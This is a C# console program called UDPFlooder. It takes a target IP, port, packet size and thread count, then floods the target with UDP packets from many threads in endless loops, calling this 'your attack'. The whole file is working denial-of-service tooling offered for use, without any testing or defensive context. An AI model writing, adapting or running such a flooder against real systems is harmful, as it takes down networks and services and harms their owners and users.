using System.Net;
using System.Net.Sockets;

public class Program
{
    public static void Main(string[] args)
    {
        try
        {
            if (args.Length != 4)
            {
                Console.WriteLine("Invalid parameters specified\r\n" +
                    "\"dotnet UDPFlooder.dll <ip> <port> <size> <threads>\"");
                return;
            }

            string ip = args[0];
            uint port = uint.Parse(args[1]), size = uint.Parse(args[2]), threads = uint.Parse(args[3]);
            int thePort = (int)port;

            try
            {
                IPAddress.Parse(ip);
            }
            catch
            {
                Console.WriteLine("Invalid IP Address specified.");
                return;
            }

            if (port > 65535)
            {
                Console.WriteLine("Invalid port specified.");
                return;
            }

            if (size > 1400)
            {
                Console.WriteLine("Invalid size specified.");
                return;
            }

            byte[] buffer = new byte[size];

            for (int i = 0; i < size; i++)
            {
                buffer[i] = 0x20;
            }

            for (int i = 0; i < threads; i++)
            {
                new Thread(() =>
                {
                    try
                    {
                        UdpClient client = new UdpClient(ip, thePort);

                        while (true)
                        {
                            try
                            {
                                client.Send(buffer, buffer.Length);
                            }
                            catch
                            {

                            }
                        }
                    }
                    catch
                    {

                    }
                }).Start();
            }

            Console.WriteLine($"Succesfully started your attack at {ip}:{port} with size {size} and threads {threads}. Press CTRL + C to stop the attack.");
        }
        catch (Exception ex)
        {
            Console.WriteLine("An error occured while executing the program.\r\n" +
                ex.Message + "\r\n" + ex.StackTrace + "\r\n" + ex.Source);
        }
    }
}